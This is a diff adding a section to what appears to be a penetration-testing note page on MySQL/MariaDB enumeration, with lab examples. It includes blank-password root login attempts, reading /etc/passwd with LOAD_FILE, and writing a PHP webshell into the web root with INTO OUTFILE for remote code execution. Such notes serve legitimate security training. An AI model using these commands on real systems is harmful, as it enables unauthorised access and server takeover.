@@ -5,6 +5,102 @@ description: "Inspect MySQL accounts, databases, and privileges, including the r
 keywords: ["mysql", "mariadb", "3306", "information_schema", "load_file", "into outfile", "secure_file_priv"]
 ---
 
+## mysql: choose the operation and read the result
+
+Connect to MySQL/MariaDB and query databases.
+
+### What the result establishes
+
+Identify version, current database, effective user and grants before selecting schemas, tables and columns.
+
+### Prerequisites and common failures
+
+SQL access, FILE privilege, server filesystem access and OS execution are separate capabilities; avoid assuming a remote DB shares the web host's filesystem.
+
+### Example 1: Commands
+
+Run in: **Kali / MySQL prompt**.
+
+```bash
+mysql -h TARGET_IP -u USER -p
+# Inside mysql
+SHOW DATABASES;
+USE DATABASE_NAME;
+SHOW TABLES;
+```
+
+### Example 2: Footprinting & scanning
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap <IP> -sV -sC -p3306 --script mysql*
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Footprinting & scanning
+
+Run in: **Saved lab example**.
+
+```bash
+mysql -u root -h <IP>      # try a blank-password root login directly
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Footprinting & scanning](/enumeration/mysql-mariadb-cheat-sheet#footprinting-&-scanning). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Connecting & interacting
+
+Run in: **Saved lab example**.
+
+```bash
+mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the password
+mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
+```
+
+Saved context: [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: From DB access to the filesystem (and RCE)
+
+Run in: **Saved lab example**.
+
+```sql
+-- Check whether file operations are allowed and where they're confined
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- Read an arbitrary local file as the MySQL service account
+SELECT LOAD_FILE('/etc/passwd');
+
+-- Write a PHP webshell into the web root → browse to it for RCE
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+Saved context: [MySQL and MariaDB Enumeration — From DB access to the filesystem (and RCE)](/enumeration/mysql-mariadb-cheat-sheet#from-db-access-to-the-filesystem-and-rce). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: SQL Syntax
+
+Run in: **Saved lab example**.
+
+```bash
+mysql> USE htbusers;
+```
+
+Saved context: [Common Services: Full Module Reference — SQL Syntax](/modules/common-services/full-reference#sql-syntax). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Select a Database
+
+Run in: **Saved lab example**.
+
+```text
+mysql> USE htbusers;
+
+Database changed
+```
+
+Saved context: [Attacking SQL Databases: Module Notes — Select a Database](/modules/common-services/sql#select-a-database). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 {/* SERVICE_TOOLS_START */}
 
 ## Tools for this service
